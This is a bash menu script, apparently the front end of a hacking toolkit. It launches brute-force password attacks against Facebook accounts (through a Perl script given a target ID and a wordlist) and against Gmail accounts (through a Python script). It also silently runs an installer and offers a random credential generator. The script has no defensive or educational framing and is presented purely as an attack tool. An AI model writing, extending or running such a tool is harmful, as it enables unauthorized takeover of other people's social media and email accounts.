#!/bin/bash
# Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
nc="\e[0m"  # No Color

# Functions to generate random usernames and passwords
generate_password() {
    local length=$1
    tr -dc 'A-Za-z0-9@#%&*+=-_!~' </dev/urandom | head -c "$length"
}

generate_username() {
    local prefix="user"
    local random_number=$((RANDOM % 1000 + 100))
    echo "${prefix}${random_number}"
}

# Installation Check
sleep 1
echo -e "Checking Installation $nc"
bash install-sb.sh >> /dev/null
echo -e "Checking Completed [$green✓$nc] $nc"
sleep 1
clear

# Startup Banner
echo -e "$green"
echo "__________                __           ___________                         "
echo "\______   \_______ __ ___/  |_  ____   \_   _____/__________   ____  ____  "
echo " |    |  _/\_  __ \  |  \   __\/ __ \   |    __)/  _ \_  __ \_/ ___\/ __ \ "
echo " |    |   \ |  | \/  |  /|  | \  ___/   |     \(  <_> )  | \/\  \__\  ___/ "
echo " |______  / |__|  |____/ |__|  \___  >  \___  / \____/|__|    \___  >___  >"
echo "        \/                         \/       \/                    \/    \/ "
echo -e "                                                         $nc $blue LTP$nc"
echo ""

# Menu Options
while true; do
    echo -e "$yellow Select From Menu: $nc"
    echo -e "	$blue 1 : Brute Force Facebook Account$nc"
    echo -e "	$blue 2 : Brute Force Gmail Account$nc"
    echo -e "	$blue 3 : Generate Username and Password$nc"
    echo -e "	$blue 0 : Exit$nc"
    read -p "Choice > " ch

    # Facebook Brute Force
    if [[ $ch -eq 1 ]]; then
        echo -e "$green Facebook Brute Force Selected$nc"
        read -p "Enter Facebook ID / Email / Username / Number: " id
        read -p "Enter wordlist path: " wordlist
        cd facebook
        perl fb-brute.pl $id $wordlist
        echo -e "$yellow Brute Force Complete $nc[$green✓$nc]"

    # Gmail Brute Force
    elif [[ $ch -eq 2 ]]; then
        echo -e "$green Gmail Brute Force Selected$nc"
        cd Gemail-Hack
        python2 gemailhack.py
        echo -e "$yellow Brute Force Complete $nc[$green✓$nc]"

    # Generate Username and Password
    elif [[ $ch -eq 3 ]]; then
        echo -e "$blue Generating Random Username and Password...$nc"
        username=$(generate_username)
        password=$(generate_password 12)
        echo -e "$green Username: $blue$username$nc"
        echo -e "$green Password: $yellow$password$nc"

        # Optional: Save to a file
        echo "Username: $username" >> generated_credentials.txt
        echo "Password: $password" >> generated_credentials.txt
        echo "----------------------" >> generated_credentials.txt
        echo -e "$yellow Credentials saved to generated_credentials.txt$nc"

    # Exit Option
    elif [[ $ch -eq 0 ]]; then
        echo -e "$red Program Exit...$nc"
        exit 0
    else
        echo -e "$red Invalid choice, please try again!$nc"
    fi
    echo ""
done
